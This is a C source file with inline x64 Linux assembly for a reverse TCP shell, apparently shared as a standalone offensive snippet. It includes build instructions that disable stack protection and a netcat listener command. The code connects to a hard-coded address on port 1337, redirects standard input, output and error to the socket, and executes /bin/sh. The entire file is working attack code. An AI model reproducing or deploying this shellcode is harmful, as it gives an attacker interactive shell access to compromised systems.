//x64 Linux reverse TCP connect intel assembly

/*
* Author:           FXC
* Build/Run:        gcc -masm=intel -z execstack -fno-stack-protector reverse_shell_x64_asm.c -o reverse_shell_x64_asm
*                   nc -lvnp 1337
*/

int main(void)
{
	__asm__(
	// socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	"push 2;"
	"pop rdi;"
	"push 1;"
	"pop rsi;"
	"xor rdx, rdx;"
	"push 0x29;"
	"pop rax;"
	"syscall;"
	// connect(sockfd, (struct sockaddr *)&addr, sizeof(addr))
	"push rax;"
	"pop rdi;"
	"mov rdx, 0x0100007f39050002;"
	"push rdx;"
	"push rdx;"
	"mov rsi, rsp;"
	"mov rdx, 0x10;"
	"push 0x2a;"
	"pop rax;"
	"syscall;"
	// dup2(sockfd, 0);
	"xor rsi, rsi;"
	"push 0x21;"
	"pop rax;"
	"syscall;"
	// dup2(sockfd, 1);
	"push 1;"
	"pop rsi;"
	"push 0x21;"
	"pop rax;"
	"syscall;"
	// dup2(sockfd, 2);
	"push 2;"
	"pop rsi;"
	"push 0x21;"
	"pop rax;"
	"syscall;"
	// execve("/bin/sh", NULL, NULL)
	"mov rax, 0x68732f6e69622f;"
	"push rax;"
	"mov rdi, rsp;"
	"xor rsi, rsi;"
	"xor rdx, rdx;"
	"push 0x3b;"
	"pop rax;"
	"syscall;"
	);
}

